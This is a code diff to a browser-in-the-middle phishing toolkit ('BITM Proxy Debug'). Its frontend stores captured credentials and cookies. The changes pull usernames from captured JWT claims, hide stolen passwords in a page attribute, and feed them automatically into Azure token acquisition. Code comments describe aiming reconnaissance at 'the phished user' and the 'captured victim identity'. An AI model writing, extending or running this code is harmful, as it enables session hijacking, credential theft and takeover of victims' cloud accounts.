@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.41.0")
+app = FastAPI(title="BITM Proxy Debug", version="1.41.2")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -7413,6 +7413,18 @@ function guessUserPass(d){
   // combined "user:pass" string so it isn't mistaken for either field.
   if(!guessUser) guessUser=inputs.find(v=>emailAnywhere.test(v)&&combinedIdx(v)<0)||userIdFallback||'';
   if(!guessPass) guessPass=inputs.find(v=>v&&!emailAnywhere.test(v)&&combinedIdx(v)<0&&v.length>=4)||'';
+  // Token-claims fallback: a credential minted from a token (ROPC / AAA /
+  // device-code) has no typed inputs, but the captured token's OWN claims
+  // carry the identity — still captured session data. (Password can't come
+  // from a token, so guessPass has no token fallback.)
+  if(!guessUser && Array.isArray(d.tokens)){
+    for(const t of d.tokens){
+      const tok=t&&(t.access_token||t.token||(typeof t==='string'?t:''));
+      const dec=tok?_decodeJwt(tok):null;
+      const c=dec&&(dec.payload||dec); // _decodeJwt wraps claims under .payload
+      if(c){const u=c.preferred_username||c.upn||c.email||c.unique_name||'';if(u){guessUser=u;break;}}
+    }
+  }
   return {guessUser,guessPass};
 }
 // Get-AAATokenFromAzLogin PowerShell snippet for the Captured Data
@@ -7846,7 +7858,7 @@ function renderCreds(){
           <div id="aaa-panel-${site.id}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
             <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
               <label style="color:#94a3b8;font-size:13px">Function:</label>
-              <select id="aaa-fn-${site.id}" class="cfg-input" style="min-width:280px;font-size:13px" data-user="${esc((guessUserPass(d).guessUser)||'')}" data-tid="${esc((configCache.default_tenant_id||'').trim())}" onchange="aaaFnChange('${site.id}')"></select>
+              <select id="aaa-fn-${site.id}" class="cfg-input" style="min-width:280px;font-size:13px" data-user="${esc((guessUserPass(d).guessUser)||'')}" data-pass="${esc((guessUserPass(d).guessPass)||'')}" data-tid="${esc((configCache.default_tenant_id||'').trim())}" onchange="aaaFnChange('${site.id}')"></select>
               <label style="color:#94a3b8;font-size:13px;margin-left:6px">Token:</label>
               <select id="aaa-tok-${site.id}" class="cfg-input" style="min-width:160px;font-size:13px">
                 ${(d.tokens||[]).map((t,i)=>`<option value="${i}">tokens[${i}] (${esc((t.source_url||'').slice(0,40))})</option>`).join('')||'<option value="0">(no tokens)</option>'}
@@ -8341,10 +8353,18 @@ function aaaFnChange(siteId){
   const argsEl=document.getElementById('aaa-args-'+siteId);
   if(!sel||!argsEl)return;
   const fn=sel.value;
+  const capUser=sel.dataset.user||'';
+  const q=s=>String(s).replace(/'/g,"''");
   if(fn==='Get-AAATokenFromAzLogin'){
-    const u=(sel.dataset.user||'').replace(/'/g,"''"), t=(sel.dataset.tid||'').replace(/'/g,"''");
-    argsEl.value=`-User '${u}' -Password '' -TenantId '${t}'`;
-    argsEl.title="Acquire a Graph token via Connect-AzAccount. Fill -Password. Captured creds are a USER login — do NOT add -ServicePrincipal (that's only for an app client-id + secret). Run routes to /api/aaa/login.";
+    const t=q(sel.dataset.tid||'');
+    // -User and -TenantId are seeded from the captured session; the captured
+    // password is applied at Run (see aaaRunTokenGetter) rather than shown in
+    // cleartext here. Add -Password '…' to override.
+    argsEl.value=`-User '${q(capUser)}' -TenantId '${t}'`;
+    argsEl.title=(sel.dataset.pass
+      ? "Captured password is used automatically at Run — add -Password '…' to override. "
+      : "No captured password on this credential — add -Password '…'. ")
+      + "USER login (captured creds) — do NOT add -ServicePrincipal (that's for an app client-id + secret). Run routes to /api/aaa/login.";
     return;
   }
   const fp=(aaaInfoCache&&aaaInfoCache.function_params)||{};
@@ -8355,7 +8375,10 @@ function aaaFnChange(siteId){
   // setless mandatory params, which are common to all sets).
   const sets=[...new Set(mand.filter(p=>p.set).map(p=>p.set))];
   const chosen=sets.length>1?mand.filter(p=>!p.set||p.set===sets[0]):mand;
-  argsEl.value=chosen.map(p=>p.switch?('-'+p.name):(`-${p.name} ''`)).join(' ');
+  // Pre-fill a -User/-UserId param with the captured victim identity so the
+  // recon call targets the phished user by default.
+  argsEl.value=chosen.map(p=>p.switch?('-'+p.name)
+    :(/^user(id)?$/i.test(p.name)&&capUser?`-${p.name} '${q(capUser)}'`:`-${p.name} ''`)).join(' ');
   argsEl.title=params.length
     ?'params ('+String.fromCharCode(42)+' = required): '+params.map(p=>(p.mandatory?String.fromCharCode(42):'')+'-'+p.name+(p.switch?'':" ''")+(p.set?(' ['+p.set+']'):'')).join('  ')
     :'no parameters — just Run';
@@ -8418,9 +8441,16 @@ async function aaaRunTokenGetter(siteId,argsStr,out){
   let parsed;
   try{parsed=aaaParseArgs(argsStr)}catch(e){out.innerHTML='<div style="color:#f87171">Bad args: '+esc(String(e))+'</div>';return}
   const byName={};parsed.forEach(a=>{if(a.name)byName[a.name.toLowerCase()]=(a.value!==undefined?a.value:true)});
-  const user=byName['user']||'',password=byName['password']||'',tid=byName['tenantid']||'';
+  const sel=document.getElementById('aaa-fn-'+siteId);
+  const user=byName['user']||'',tid=byName['tenantid']||'';
+  // Use -Password from the args if the operator typed one; otherwise fall back
+  // to the captured-session password stashed on the select (kept out of the
+  // visible args box).
+  let password=byName['password'];
+  if((password===undefined||password==='')&&sel&&sel.dataset.pass)password=sel.dataset.pass;
+  password=password||'';
   const sp=byName['serviceprincipal']===true;
-  if(!user||!password||!tid){out.innerHTML='<div style="color:#f87171">Get-AAATokenFromAzLogin needs -User, -Password and -TenantId</div>';return}
+  if(!user||!password||!tid){out.innerHTML='<div style="color:#f87171">Get-AAATokenFromAzLogin needs -User, -TenantId, and a password — none captured on this credential, so add <code>-Password &#39;…&#39;</code>.</div>';return}
   out.innerHTML='<div style="color:#94a3b8">Connecting (Az.Accounts → Get-AzAccessToken)…</div>';
   try{
     const r=await apiFetch('/api/aaa/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,user:user,password:password,tenant_id:tid,service_principal:sp})});
